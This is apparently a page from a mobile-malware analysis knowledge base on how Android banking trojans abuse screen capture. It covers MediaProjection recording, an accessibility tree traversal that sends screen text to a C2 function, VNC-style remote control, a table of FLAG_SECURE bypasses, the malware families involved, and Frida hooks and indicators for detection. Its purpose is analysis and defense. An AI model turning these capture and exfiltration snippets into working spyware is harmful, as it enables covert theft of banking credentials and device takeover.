# Screen Recording & MediaProjection Abuse

Capturing the victim's screen in real time to steal credentials, monitor activity, or enable remote device control. Unlike [overlay attacks](overlay-attacks.md) that present fake UI, screen capture techniques passively observe the real UI -- the victim interacts with their actual banking app while the attacker watches or records every frame.

See also: [Camera & Mic Surveillance](camera-mic-surveillance.md), [Notification Suppression](notification-suppression.md#screen-blackout-during-fraud)

??? abstract "MITRE ATT&CK"

    | ID | Technique | Tactic |
    |---|---|---|
    | [T1513](https://attack.mitre.org/techniques/T1513/) | Screen Capture | Collection |

??? warning "Requirements"

    | Requirement | Details |
    |-------------|---------|
    | Permission | [`FOREGROUND_SERVICE`](../permissions/normal/foreground-service.md) + [`FOREGROUND_SERVICE_MEDIA_PROJECTION`](../permissions/normal/foreground-service-media-projection.md) (Android 10+), or [`BIND_ACCESSIBILITY_SERVICE`](../permissions/special/bind-accessibility-service.md) |
    | User Interaction | MediaProjection consent dialog (one-time tap), or accessibility service enablement |
    | Infrastructure | C2 server or WebSocket endpoint for live streaming |

## Techniques

### MediaProjection API

The primary screen recording mechanism since Android 5.0. The `android.media.projection.MediaProjection` class creates a virtual display that mirrors the device screen. The attacker obtains a `MediaProjection` token through `MediaProjectionManager.createScreenCaptureIntent()`, which triggers a system consent dialog.

??? example "MediaProjection Setup and Virtual Display Creation"

    ```java
    MediaProjectionManager projectionManager =
        (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
    Intent captureIntent = projectionManager.createScreenCaptureIntent();
    startActivityForResult(captureIntent, REQUEST_CODE);
    ```

    On receiving the result:

    ```java
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        MediaProjection projection = projectionManager.getMediaProjection(resultCode, data);
        VirtualDisplay display = projection.createVirtualDisplay(
            "capture",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            surface, null, null
        );
    }
    ```

The `Surface` target can be an `ImageReader` for screenshots, a `MediaRecorder` for video files, or a `MediaCodec` encoder feeding frames to a network socket for live streaming.

Malware typically wraps this in a foreground service to maintain the projection while backgrounded. The encoded frames (H.264 or MJPEG) stream to C2 over WebSocket or a custom TCP protocol.

### Accessibility-Based Screen Reading

An alternative that requires no MediaProjection consent. The accessibility service traverses the `AccessibilityNodeInfo` tree to extract all visible text from the current screen.

??? example "Accessibility Tree Traversal for Screen Reading"

    ```java
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        extractNodes(root);
    }

    private void extractNodes(AccessibilityNodeInfo node) {
        if (node.getText() != null) {
            sendToC2(node.getClassName().toString(), node.getText().toString());
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractNodes(child);
                child.recycle();
            }
        }
        node.recycle();
    }
    ```

This captures text content but not visual layout, images, or rendered WebView content. For banking trojans targeting specific fields, it is often sufficient -- account balances, transaction details, and form field values are all accessible as text nodes.

### VNC / Remote Access

Several banking trojan families implement full VNC-like remote access by combining screen capture with input injection. The attacker views the victim's screen in real time and sends touch/gesture commands back to the device.

| Component | Implementation |
|-----------|---------------|
| Screen capture | MediaProjection frames encoded as H.264/VP8 |
| Input injection | Accessibility `dispatchGesture()` or `performAction()` |
| Protocol | Custom binary over WebSocket, or adapted VNC RFB protocol |
| Latency | Typically 200-500ms round trip |

This gives the attacker full interactive control of the device, enabling manual fraud operations where the attacker logs into the banking app, navigates menus, and initiates transfers while watching the screen.

### Screen Streaming to C2

The real-time streaming pipeline used by most families:

1. MediaProjection or `ImageReader` captures frames
2. Frames encoded via `MediaCodec` (hardware H.264) or downscaled to JPEG
3. Encoded data pushed over WebSocket or raw TCP to C2
4. C2 panel renders the stream, optionally with touch input relay

Frame rate is typically throttled to 1-5 FPS to reduce bandwidth. Some families (Octo, Vultur) use adaptive quality -- higher FPS during active interaction, dropping to periodic screenshots when the screen is idle.

## FLAG_SECURE Bypass Attempts

Apps can set `FLAG_SECURE` on their windows to prevent screenshots and screen recording. When active, MediaProjection captures black frames for that window.

| Bypass Method | How It Works | Effectiveness |
|---------------|-------------|---------------|
| Accessibility tree reading | Ignores FLAG_SECURE entirely since it reads node text, not pixels | Full bypass for text content |
| Root + framebuffer access | Reads `/dev/graphics/fb0` directly | Requires root, works on older kernels |
| Root + SurfaceFlinger | `screencap` via `adb shell` with elevated privileges | Requires root |
| Xposed/LSPosed hooks | Hook `Window.setFlags()` to strip FLAG_SECURE | Requires Xposed framework |
| Virtual display tricks | Some older Android versions didn't enforce FLAG_SECURE on virtual displays | Patched in Android 12+ |

Most malware relies on accessibility tree reading as the FLAG_SECURE bypass since it requires no root and works across all Android versions. The pixel-level bypasses are limited to rooted devices or exploit chains.

## Platform Lifecycle

| Android Version | API | Change | Offensive Impact |
|----------------|-----|--------|-----------------|
| 5.0 | 21 | [`MediaProjection`](https://developer.android.com/reference/android/media/projection/MediaProjection) API introduced | Screen recording possible without root for the first time |
| 5.0-9 | 21-28 | Consent dialog, no ongoing indicator | Malware shows dialog once, records indefinitely |
| 10 | 29 | [`FOREGROUND_SERVICE_MEDIA_PROJECTION`](../permissions/normal/foreground-service-media-projection.md) type required | Must declare foreground service type in manifest |
| 10 | 29 | Persistent notification required for media projection | User sees ongoing notification (malware disguises it) |
| 11 | 30 | MediaProjection token no longer reusable across app restarts | Must re-trigger consent after process death |
| 12 | 31 | StatusBar indicator for active screen sharing | User may notice colored dot indicator |
| 14 | 34 | [Consent dialog shown before each capture session](https://developer.android.com/about/versions/14/behavior-changes-14#screen-sharing) | Breaks single-consent-then-record-forever pattern |
| 14 | 34 | `onCapturedContentVisibilityChanged()` callback | Apps can detect when they are being captured |
| 15 | 35 | [Screenshot detection API](https://developer.android.com/reference/android/app/Activity.ScreenCaptureCallback) (`Activity.ScreenCaptureCallback`) | Target apps can respond to capture events |

!!! info "Trend"

    Each version makes MediaProjection harder to abuse silently. This pushes malware toward [accessibility-based screen reading](accessibility-abuse.md#screen-streaming-vnc), which remains unaffected by these mitigations.

## Families Using This Technique

| Family | Method | Details |
|--------|--------|---------|
| [Hook](../malware/families/hook.md) | VNC via accessibility | Full remote access with touch relay, streams accessibility tree state to attacker panel |
| [Octo](../malware/families/octo.md) | MediaProjection + accessibility | Live screen streaming at adaptive FPS, combined with accessibility for input injection |
| [BRATA](../malware/families/brata.md) | MediaProjection recording | Records screen to local storage, exfiltrates video files to C2 |
| [SpyNote](../malware/families/spynote.md) | MediaProjection live stream | Real-time screen sharing with bidirectional control, RAT-style remote access |
| [Vultur](../malware/families/vultur.md) | MediaProjection via AlphaVNC/ngrok | Screen recording streamed through ngrok tunnels, later versions switched to custom protocol |
| [TrickMo](../malware/families/trickmo.md) | Accessibility screen capture | Captures screen content via accessibility tree traversal, targets banking app fields |
| [Medusa](../malware/families/medusa.md) | MediaProjection + VNC | Live streaming with remote control capabilities |
| [BingoMod](../malware/families/bingomod.md) | VNC via MediaProjection | Screen-based VNC for on-device fraud |
| [Brokewell](../malware/families/brokewell.md) | MediaProjection streaming | Real-time screen mirroring to attacker |
| [Gigabud](../malware/families/gigabud.md) | MediaProjection | Screen recording triggered via accessibility, avoids overlay attacks entirely |
| [Albiriox](../malware/families/albiriox.md) | VNC via accessibility | Real-time VNC remote control for on-device fraud, black screen concealment |
| [BTMOB RAT](../malware/families/btmob.md) | MediaProjection | Live screen streaming to C2 via Media Projection API |

## Detection During Analysis

??? example "Static Indicators"

    - `FOREGROUND_SERVICE_MEDIA_PROJECTION` in `AndroidManifest.xml`
    - `MediaProjectionManager` or `createScreenCaptureIntent` in decompiled code
    - `VirtualDisplay`, `ImageReader`, or `MediaCodec` usage
    - `AccessibilityNodeInfo` tree traversal with data exfiltration
    - WebSocket or raw socket connections combined with media encoding classes

??? example "Frida: Hook MediaProjection Creation"

    ```javascript
    Java.perform(function() {
        var MediaProjectionManager = Java.use("android.media.projection.MediaProjectionManager");
        MediaProjectionManager.createScreenCaptureIntent.implementation = function() {
            console.log("[*] MediaProjection capture intent created");
            console.log(Java.use("android.util.Log").getStackTraceString(
                Java.use("java.lang.Exception").$new()
            ));
            return this.createScreenCaptureIntent();
        };

        var MediaProjection = Java.use("android.media.projection.MediaProjection");
        MediaProjection.createVirtualDisplay.overload(
            "java.lang.String", "int", "int", "int", "int",
            "android.view.Surface", "android.hardware.display.VirtualDisplay$Callback",
            "android.os.Handler"
        ).implementation = function(name, w, h, dpi, flags, surface, cb, handler) {
            console.log("[*] VirtualDisplay created: " + name + " (" + w + "x" + h + ")");
            return this.createVirtualDisplay(name, w, h, dpi, flags, surface, cb, handler);
        };
    });
    ```

??? example "Frida: Monitor Accessibility Tree Traversal"

    ```javascript
    Java.perform(function() {
        var AccessibilityNodeInfo = Java.use("android.view.accessibility.AccessibilityNodeInfo");
        AccessibilityNodeInfo.getText.implementation = function() {
            var text = this.getText();
            if (text != null) {
                console.log("[*] AccessibilityNodeInfo.getText(): " + text.toString());
            }
            return text;
        };
    });
    ```

??? example "Dynamic Indicators"

    - Foreground service notification appearing after accessibility enablement
    - High CPU usage from `MediaCodec` encoding
    - Sustained outbound data stream (WebSocket or TCP) with consistent bandwidth
    - `VirtualDisplay` instance visible in `dumpsys display`
    - Accessibility service with `flagRetrieveInteractiveWindows` and `flagRequestFilterKeyEvents`

## Relationship to Other Techniques

Screen capture is often combined with other attack techniques:

- [Accessibility abuse](accessibility-abuse.md) provides the input injection needed for full remote access
- [Overlay attacks](overlay-attacks.md) are sometimes replaced entirely by screen capture (the attacker watches the victim use the real app)
- [Keylogging](keylogging.md) captures the same credential data through input events rather than visual observation
